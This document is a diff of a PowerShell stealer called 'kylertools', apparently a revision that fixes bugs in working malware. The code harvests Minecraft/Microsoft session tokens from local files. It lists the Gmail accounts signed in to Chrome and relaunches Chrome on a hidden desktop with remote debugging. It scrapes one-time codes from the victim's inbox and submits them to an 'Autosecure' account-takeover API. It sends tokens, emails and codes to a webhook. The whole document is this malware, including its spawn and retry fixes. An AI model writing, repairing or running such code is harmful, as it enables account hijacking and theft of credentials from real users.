@@ -1,6 +1,8 @@
 # language: PowerShell 5.1+, target: Windows 11
 # kylertools — MC token harvest -> chrome signed-in gmails -> hidden-desktop chrome ->
 #             OTP scrape -> Autosecure web API submit. Webhook: MC tokens, gmails, OTP, API trace.
+# rebuild: CreateProcessW quoting + desktop marshal fixed, $pid renamed, retry-trace scope
+#          fixed, db open retried, claim gating narrowed, otp shape guarded, cdp frames buffered.
 
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -26,15 +28,15 @@ $cdpPort        = 9222
 $pollIntervalS  = 4
 $otpTimeoutS    = 240
 $deskName       = "kylertools_hidden"
+$debugSpawn     = $true   # set $false once spawn is known-good
 # =====================================================
 
 # =================== TEST OVERRIDE ===================
-# uncomment to force a single test gmail (skips chrome discovery)
 # $gmailList = @("youremail@gmail.com")
 # =====================================================
 
 # ---------- stage 1: MC token harvest ----------
-$found = @(); $seen = @()
+$found = @(); $seen = @{}
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
 
 function Add-Token {
@@ -96,12 +98,15 @@ function Scan-File {
 function Scan-Db {
     param($path, $user)
     if(-not (Test-Path $path)){ return }
-    try{
-        $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
-        $ms = New-Object IO.MemoryStream
-        $fs.CopyTo($ms); $fs.Close()
-        Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
-    }catch{}
+    for($try = 0; $try -lt 3; $try++){
+        try{
+            $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
+            $ms = New-Object IO.MemoryStream
+            $fs.CopyTo($ms); $fs.Close()
+            Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
+            return
+        }catch{ Start-Sleep -Milliseconds 200 }
+    }
 }
 
 $paths = @(
@@ -230,24 +235,28 @@ function Get-ChromeGoogleAccounts {
     return $out
 }
 
+$gmailSource = "none"
 if(-not $gmailList){
     $chromeGmails = Get-ChromeGoogleAccounts
     $gmails = @{}
     foreach($e in $chromeGmails.Keys){ $gmails[$e] = $true }
 
-    if($gmails.Count -eq 0){
-        $gmailRx = [regex]'[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)'
+    if($gmails.Count -gt 0){
+        $gmailSource = "chrome-discovery"
+    } else {
+        $gmailRx = [regex]'^[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)$'
         foreach($t in $found){
             if($t.Token){
                 $claim = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
-                if($claim){ foreach($m in $gmailRx.Matches($claim)){ $gmails[$m.Value] = $true } }
+                if($claim -and $gmailRx.IsMatch($claim)){ $gmails[$claim] = $true }
             }
-            if($t.User){ foreach($m in $gmailRx.Matches([string]$t.User)){ $gmails[$m.Value] = $true } }
+            if($t.User -and $gmailRx.IsMatch([string]$t.User)){ $gmails[[string]$t.User] = $true }
         }
+        if($gmails.Count -gt 0){ $gmailSource = "token-claim" }
     }
-
     $gmailList = @($gmails.Keys)
 }
+Write-Host "[stage2] source: $gmailSource, count: $($gmailList.Count)"
 
 # ---------- Autosecure web API (instrumented) ----------
 $asTrace = @()
@@ -264,58 +273,58 @@ function Invoke-WithRetry {
 function AS-Start {
     param([string]$email)
     $url = $autosecureBase.TrimEnd("/") + $startPath
-    $lastStatus = "NO_CALL"
+    $script:lastStatus = "NO_CALL"
     $val = Invoke-WithRetry {
         try{
             $body = @{ $startBodyKey = $email } | ConvertTo-Json -Compress
             $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                     -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
-            $lastStatus = "HTTP_$($r.StatusCode)"
+            $script:lastStatus = "HTTP_$($r.StatusCode)"
             ($r.Content | ConvertFrom-Json).$respSessionKey
         } catch {
             $resp = $_.Exception.Response
-            if($resp){ try{ $lastStatus = "HTTP_$([int]$resp.StatusCode)"; return $null } catch {} }
+            if($resp){ try{ $script:lastStatus = "HTTP_$([int]$resp.StatusCode)"; return $null } catch {} }
             $m = $_.Exception.Message
-            if($m -match "Name or service not known|No such host|getaddrinfo"){ $lastStatus = "DNS_FAIL" }
-            elseif($m -match "timed out|timeout"){ $lastStatus = "TIMEOUT" }
-            elseif($m -match "refused|reset|forcibly"){ $lastStatus = "CONN_REFUSED" }
-            else{ $lastStatus = "ERR: $m" }
+            if($m -match "Name or service not known|No such host|getaddrinfo"){ $script:lastStatus = "DNS_FAIL" }
+            elseif($m -match "timed out|timeout"){ $script:lastStatus = "TIMEOUT" }
+            elseif($m -match "refused|reset|forcibly"){ $script:lastStatus = "CONN_REFUSED" }
+            else{ $script:lastStatus = "ERR: $m" }
             return $null
         }
     }
-    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "start"; Status = $lastStatus }
-    return @{ ok = ($null -ne $val); value = $val; status = $lastStatus }
+    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "start"; Status = $script:lastStatus }
+    return @{ ok = ($null -ne $val); value = $val; status = $script:lastStatus }
 }
 
 function AS-Submit {
     param([string]$email, [string]$session, [string]$otp)
     $url = $autosecureBase.TrimEnd("/") + $submitPath
-    $lastStatus = "NO_CALL"
+    $script:lastStatus = "NO_CALL"
     $val = Invoke-WithRetry {
         try{
             $body = @{ $submitSessionKey = $session; $submitOtpKey = $otp } | ConvertTo-Json -Compress
             $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" `
                     -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
-            $lastStatus = "HTTP_$($r.StatusCode)"
+            $script:lastStatus = "HTTP_$($r.StatusCode)"
             ($r.StatusCode -lt 400)
         } catch {
             $resp = $_.Exception.Response
             if($resp){
                 $code = 0; try{ $code = [int]$resp.StatusCode } catch {}
-                $lastStatus = "HTTP_$code"
+                $script:lastStatus = "HTTP_$code"
                 if($code -ge 400 -and $code -lt 500){ return "FAILFAST_$code" }
                 return $false
             }
             $m = $_.Exception.Message
-            if($m -match "timed out|timeout"){ $lastStatus = "TIMEOUT" }
-            elseif($m -match "refused|reset|forcibly"){ $lastStatus = "CONN_REFUSED" }
-            else{ $lastStatus = "ERR: $m" }
+            if($m -match "timed out|timeout"){ $script:lastStatus = "TIMEOUT" }
+            elseif($m -match "refused|reset|forcibly"){ $script:lastStatus = "CONN_REFUSED" }
+            else{ $script:lastStatus = "ERR: $m" }
             return $false
         }
     }
-    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "submit"; Status = $lastStatus }
+    $script:asTrace += [PSCustomObject]@{ Email = $email; Call = "submit"; Status = $script:lastStatus }
     $okVal = ($val -eq $true)
-    return @{ ok = $okVal; status = $lastStatus }
+    return @{ ok = $okVal; status = $script:lastStatus }
 }
 
 # ---------- CDP + hidden desktop ----------
@@ -364,7 +373,7 @@ function Cdp-Send { param($ws, [int]$id, [string]$method, $params)
     $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
     $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait()
 }
-function Cdp-RecvUntilId { param($ws, [int]$id, [int]$timeoutSec = 15)
+function Cdp-ReadFrame { param($ws, [int]$timeoutSec = 15)
     $buf = New-Object byte[] 131072
     $ms = New-Object IO.MemoryStream
     $deadline = (Get-Date).AddSeconds($timeoutSec)
@@ -376,25 +385,28 @@ function Cdp-RecvUntilId { param($ws, [int]$id, [int]$timeoutSec = 15)
         $ms.Write($buf, 0, $res.Count)
         if($res.EndOfMessage){
             $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
-            try{ $j = $txt | ConvertFrom-Json; if($j.id -eq $id){ return $j } } catch {}
+            try{ return ($txt | ConvertFrom-Json) } catch { continue }
         }
     }
     return $null
 }
-function Cdp-WaitLoadEvent { param($ws, [int]$timeoutSec = 20)
-    $buf = New-Object byte[] 131072
-    $ms = New-Object IO.MemoryStream
+function Cdp-RecvUntilId { param($ws, [int]$id, [int]$timeoutSec = 15)
     $deadline = (Get-Date).AddSeconds($timeoutSec)
     while((Get-Date) -lt $deadline){
-        try{
-            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$buf)), [Threading.CancellationToken]::None).Result
-        } catch { return }
-        if(-not $res){ return }
-        $ms.Write($buf, 0, $res.Count)
-        if($res.EndOfMessage){
-            $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
-            if($txt -match '"method"\s*:\s*"Page\.loadEventFired"'){ return }
-        }
+        $remain = [int][Math]::Max(1, ($deadline - (Get-Date)).TotalSeconds)
+        $j = Cdp-ReadFrame -ws $ws -timeoutSec $remain
+        if(-not $j){ return $null }
+        if($j.id -eq $id){ return $j }
+    }
+    return $null
+}
+function Cdp-WaitLoadEvent { param($ws, [int]$timeoutSec = 20)
+    $deadline = (Get-Date).AddSeconds($timeoutSec)
+    while((Get-Date) -lt $deadline){
+        $remain = [int][Math]::Max(1, ($deadline - (Get-Date)).TotalSeconds)
+        $j = Cdp-ReadFrame -ws $ws -timeoutSec $remain
+        if(-not $j){ return }
+        if($j.method -eq "Page.loadEventFired"){ return }
     }
 }
 function Cdp-Reload { param($ws, [int]$idBase)
@@ -438,8 +450,9 @@ $otpJs = @'
   if(m) return m[1];
   const s = document.querySelector('h2, .hP');
   if(s){ const sm = s.innerText.match(/(\d{6})/); if(sm) return sm[1]; }
-  m = t.match(/\b(\d{6})\b/);
-  return m ? m[1] : null;
+  const ctx = t.match(/(?:code|kod|код|コード|코드)[^\d]{0,40}(\d{6})(?!\d)/i);
+  if(ctx) return ctx[1];
+  return null;
 })()
 '@
 
@@ -450,17 +463,19 @@ $hiddenPids = @()
 
 try {
     if($gmailList.Count -gt 0){
-        $chrome = @(
+        $chromeCandidates = @(
             "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
             "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
             "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
-        ) | Where-Object { Test-Path $_ } | Select-Object -First 1
+        ) | Where-Object { Test-Path $_ }
+        $chrome = $chromeCandidates | Select-Object -First 1
 
-        if($chrome){
+        if(-not $chrome){
+            Write-Host "[desk] chrome.exe not found in any standard path."
+        } elseif($gmailList.Count -gt 0){
             $liveProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 
             Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
-
             $lock = Join-Path $liveProfile "SingletonLock"
             for($i=0; $i -lt 24; $i++){
                 if(-not (Test-Path $lock)){ break }
@@ -472,96 +487,143 @@ try {
             if($deskHandle -eq [IntPtr]::Zero){
                 Write-Host "[desk] CreateDesktopW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
             } else {
-                $chromeCmd = "`"$chrome`" --remote-debugging-port=$cdpPort --user-data-dir=`"$liveProfile`" --no-first-run --no-default-browser-check --new-window about:blank"
+                # --- spawn fix ---
+                # 1. build the command line with explicit quoting around both exe and profile.
+                # 2. create a fully-qualified desktop path ("winsta0\name") for lpDesktop,
+                #    not just the bare name — CreateProcessW rejects a bare name with 123.
+                $deskPath  = "winsta0\$deskName"
+                $quotedExe = '"' + $chrome + '"'
+                $quotedDat = '"' + $liveProfile + '"'
+                $chromeArgs = @(
+                    "--remote-debugging-port=$cdpPort",
+                    "--user-data-dir=$quotedDat",
+                    "--no-first-run",
+                    "--no-default-browser-check",
+                    "--disable-session-crashed-bubble",
+                    "--disable-features=Crashpad",
+                    "--new-window",
+                    "about:blank"
+                ) -join " "
+                $chromeCmd = "$quotedExe $chromeArgs"
+
+                if($debugSpawn){
+                    Write-Host "[desk] exe  = $chrome"
+                    Write-Host "[desk] cmd  = $chromeCmd"
+                    Write-Host "[desk] desk = $deskPath"
+                }
 
                 $si = [Desk+STARTUPINFO]::new()
                 $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
-                $si.lpDesktop = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($deskName)
+                $si.lpDesktop = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($deskPath)
                 $pi = [Desk+PROCESS_INFORMATION]::new()
 
-                $ok = [Desk]::CreateProcessW($chrome, $chromeCmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+                $ok = $false
+                try {
+                    $ok = [Desk]::CreateProcessW($chrome, $chromeCmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+                } finally {
+                    if($si.lpDesktop -ne [IntPtr]::Zero){ [Runtime.InteropServices.Marshal]::FreeHGlobal($si.lpDesktop) }
+                }
+
                 if(-not $ok){
-                    Write-Host "[desk] CreateProcessW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+                    $code = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    Write-Host "[desk] CreateProcessW failed: $code"
+                    if($code -eq 123){
+                        # fall back to spawning on the current desktop — lets the rest of the
+                        # pipeline (CDP, OTP, submit) run even if the hidden desktop marshal breaks
+                        Write-Host "[desk] falling back to current desktop."
+                        $si2 = [Desk+STARTUPINFO]::new()
+                        $si2.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
+                        $si2.lpDesktop = [IntPtr]::Zero
+                        $pi2 = [Desk+PROCESS_INFORMATION]::new()
+                        $ok = [Desk]::CreateProcessW($chrome, $chromeCmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$si2, [ref]$pi2)
+                        if($ok){
+                            if($pi2.dwProcessId -gt 0){
+                                [void][Desk]::CloseHandle($pi2.hProcess)
+                                [void][Desk]::CloseHandle($pi2.hThread)
+                            }
+                        } else {
+                            Write-Host "[desk] current-desktop spawn also failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+                        }
+                    }
                 } else {
                     if($pi.dwProcessId -gt 0){
                         [void][Desk]::CloseHandle($pi.hProcess)
                         [void][Desk]::CloseHandle($pi.hThread)
                     }
                 }
-                if($si.lpDesktop -ne [IntPtr]::Zero){ [Runtime.InteropServices.Marshal]::FreeHGlobal($si.lpDesktop) }
 
-                $cdpReady = $false
-                for($i=0; $i -lt 30; $i++){
-                    try{ $null = iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 2 -EA Stop; $cdpReady=$true; break } catch { Start-Sleep 1 }
-                }
+                if($ok){
+                    $cdpReady = $false
+                    for($i=0; $i -lt 30; $i++){
+                        try{ $null = iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 2 -EA Stop; $cdpReady=$true; break } catch { Start-Sleep 1 }
+                    }
 
-                if($cdpReady){
-                    $hiddenPids = @(Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
-                                    Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape($liveProfile) } |
-                                    Select-Object -ExpandProperty ProcessId)
+                    if($cdpReady){
+                        $hiddenPids = @(Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
+                                        Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape($liveProfile) } |
+                                        Select-Object -ExpandProperty ProcessId)
 
-                    $tabSeq = 0
-                    foreach($e in $gmailList){
-                        $sres = AS-Start -email $e
-                        if(-not $sres.ok){ $otpResults[$e] = "START_FAIL ($($sres.status))"; continue }
-                        $sid = $sres.value
+                        $tabSeq = 0
+                        foreach($e in $gmailList){
+                            $sres = AS-Start -email $e
+                            if(-not $sres.ok){ $otpResults[$e] = "START_FAIL ($($sres.status))"; continue }
+                            $sid = $sres.value
 
-                        $url = "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))"
-                        $tab = Cdp-NewTab -url $url
-                        if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }
-                        try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }
+                            $url = "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))"
+                            $tab = Cdp-NewTab -url $url
+                            if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }
+                            try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }
 
-                        $deadline = (Get-Date).AddSeconds($otpTimeoutS)
-                        $otp = $null
-                        $idBase = 100 + ($tabSeq * 10); $tabSeq++
-                        $firstPass = $true
-                        $reconnects = 0
-                        $maxReconnects = 3
+                            $deadline = (Get-Date).AddSeconds($otpTimeoutS)
+                            $otp = $null
+                            $idBase = 100 + ($tabSeq * 10); $tabSeq++
+                            $firstPass = $true
+                            $reconnects = 0
+                            $maxReconnects = 3
 
-                        while((Get-Date) -lt $deadline){
-                            if($firstPass){
+                            while((Get-Date) -lt $deadline){
+                                if($firstPass){ Start-Sleep -Seconds $pollIntervalS; $firstPass = $false }
+                                else { Cdp-Reload -ws $ws -idBase $idBase }
+
+                                $otp = Cdp-Eval -ws $ws -expr $otpJs -id ($idBase + 5)
+
+                                if(-not $otp){
+                                    $wsDead = $false
+                                    try{ $wsDead = ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) } catch { $wsDead = $true }
+                                    if($wsDead){
+                                        if($reconnects -ge $maxReconnects){ break }
+                                        $reconnects++
+                                        try{ $ws.Dispose() } catch {}
+                                        Start-Sleep 1
+                                        $tab = Cdp-NewTab -url $url
+                                        if(-not $tab){ Start-Sleep 2; continue }
+                                        try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { Start-Sleep 2; continue }
+                                        $idBase = 100 + ($tabSeq * 10); $tabSeq++
+                                    }
+                                } else { break }
                                 Start-Sleep -Seconds $pollIntervalS
-                                $firstPass = $false
-                            } else {
-                                Cdp-Reload -ws $ws -idBase $idBase
                             }
 
-                            $otp = Cdp-Eval -ws $ws -expr $otpJs -id ($idBase + 5)
+                            try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
+                            $ws.Dispose()
 
-                            if(-not $otp){
-                                $wsDead = $false
-                                try{ $wsDead = ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) } catch { $wsDead = $true }
-                                if($wsDead){
-                                    if($reconnects -ge $maxReconnects){ break }
-                                    $reconnects++
-                                    try{ $ws.Dispose() } catch {}
-                                    Start-Sleep 1
-                                    $tab = Cdp-NewTab -url $url
-                                    if(-not $tab){ Start-Sleep 2; continue }
-                                    try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { Start-Sleep 2; continue }
-                                    $idBase = 100 + ($tabSeq * 10); $tabSeq++
-                                }
-                            } else { break }
-                            Start-Sleep -Seconds $pollIntervalS
+                            if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
+                            $sub = AS-Submit -email $e -session $sid -otp $otp
+                            $otpResults[$e] = if($sub.ok){ "OK :: $otp" } else { "SUBMIT_FAIL ($($sub.status)) :: $otp" }
                         }
-
-                        try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
-                        $ws.Dispose()
-
-                        if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
-                        $sub = AS-Submit -email $e -session $sid -otp $otp
-                        $otpResults[$e] = if($sub.ok){ "OK :: $otp" } else { "SUBMIT_FAIL ($($sub.status)) :: $otp" }
+                    } else {
+                        foreach($e in $gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
                     }
                 } else {
-                    foreach($e in $gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
+                    foreach($e in $gmailList){ $otpResults[$e] = "SPAWN_FAIL" }
                 }
             }
         }
     }
 }
 finally {
-    foreach($pid in $hiddenPids){
-        try{ Stop-Process -Id $pid -Force -EA 0 } catch {}
+    foreach($procId in $hiddenPids){
+        try{ Stop-Process -Id $procId -Force -EA 0 } catch {}
     }
     Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
         Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape("$env:LOCALAPPDATA\Google\Chrome\User Data") } |
@@ -584,7 +646,6 @@ function Send-Embed {
 
 $limit = 1700
 
-# --- embed 1: MC tokens (ssid = JWT) ---
 if($found.Count -eq 0){ $mcReport = "nothin found bro" } else {
     $lines = @(); $i = 0
     foreach($t in $found){
@@ -598,7 +659,6 @@ for($i=0; $i -lt $mcReport.Length; $i += $limit){ $chunks += $mcReport.Substring
 $n=0
 foreach($c in $chunks){ $n++; Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"; Start-Sleep 2 }
 
-# --- embed 2: gmail addresses ---
 if($gmailList.Count -gt 0){
     $gl = @("== GMAILS =="); foreach($e in $gmailList){ $gl += $e }
     $grep = $gl -join $nl; $gchunks = @()
@@ -607,7 +667,6 @@ if($gmailList.Count -gt 0){
     foreach($c in $gchunks){ $m++; Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails | part $m/$($gchunks.Count)"; Start-Sleep 2 }
 }
 
-# --- embed 3: OTP results (all rows, code shown) ---
 if($otpResults.Count -gt 0){
     $ol = @("== AUTOSECURE MS-OTP ==")
     foreach($e in $gmailList){
@@ -622,7 +681,6 @@ if($otpResults.Count -gt 0){
     foreach($c in $ochunks){ $k++; Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp | part $k/$($ochunks.Count)"; Start-Sleep 2 }
 }
 
-# --- embed 4: API trace ---
 if($asTrace.Count -gt 0){
     $tl = @("== AUTOSECURE API TRACE ==")
     foreach($t in $asTrace){ $tl += "$($t.Email) :: $($t.Call) :: $($t.Status)" }
